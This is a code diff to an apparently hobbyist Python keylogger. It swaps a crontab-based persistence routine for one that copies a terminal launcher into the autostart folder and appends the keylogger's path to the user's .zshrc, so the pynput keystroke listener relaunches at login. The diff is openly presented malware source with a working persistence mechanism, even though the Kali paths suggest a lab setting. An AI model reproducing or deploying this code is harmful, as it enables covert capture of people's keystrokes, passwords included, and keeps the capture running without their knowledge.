@@ -1,12 +1,11 @@
 #Import Key and Listener module
 import subprocess
 import sys
+import shutil
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "python-crontab"])
 
 from pynput.keyboard import Key, Listener
-from crontab import CronTab
 
 
 print('''________                 __  .__              __                 __    
@@ -54,13 +53,35 @@ def on_release(key):
   if key==Key.esc:
     return my_bool
       
-def cron():
-    my_cron = CronTab(user=True)
-    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
-    job.every_reboot()
-    my_cron.write()
+def persistence():
+    # Copy qterminal.desktop to autostart folder
+    terminal_path = "/usr/share/applications/qterminal.desktop"
+    autostart_path = "/home/kali/.config/autostart"
+    shutil.copy(terminal_path, autostart_path)
 
-cron()
+    file_location = "/home/kali/.zshrc"
+    command = "/home/kali/Downloads/keylog2.py"
+    
+    # Open .zshrc file and check for entry for script
+    with open(file_location) as file:
+        file = file.readlines()
+        # Strip newline character from last line of file and check if it matches command
+        entry = file[-1].strip()
+        if entry != command:
+            append_command()
+            print("Line created.")
+        else:
+            print("Line already exists.")
+
+def append_command():
+    # Add entry into .zshrc file
+    file_location = "/home/kali/.zshrc"
+    command = "/home/kali/Downloads/keylog2.py"
+
+    with open(file_location, "a") as file:
+        file.write(command)
+
+persistence()
     
 #Will continously loop through until broken
 with Listener(on_press=on_press, on_release=on_release) as listener:
